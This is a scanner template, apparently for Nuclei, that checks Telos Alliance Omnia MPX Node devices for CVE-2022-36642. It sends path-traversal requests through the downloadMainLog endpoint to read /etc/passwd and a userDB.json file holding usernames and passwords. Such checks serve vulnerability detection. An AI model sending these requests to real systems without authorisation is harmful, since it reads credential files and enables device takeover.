id: CVE-2022-36642
info:
  name: Telos Alliance Omnia MPX Node File Reading Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Telos Alliance Omnia MPX Node is vulnerable to a file disclosure vulnerability
    in versions 1.5.0+r1 and earlier. This vulnerability allows attackers to elevate
    privileges to root and execute arbitrary commands by exploiting file read from
    specific endpoints.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36642
  classification:
    cve-id: CVE-2022-36642
    cvss-score: 7.6
  tags: file-read
http:
  - raw:
      - |
        GET /logs/downloadMainLog?fname=../../../../../../..//etc/passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[x*]:0:0"
  - raw:
      - |
        GET /logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"username":'
          - '"password":'
          - '"mustChangePwd":'
          - '"roleUser"'
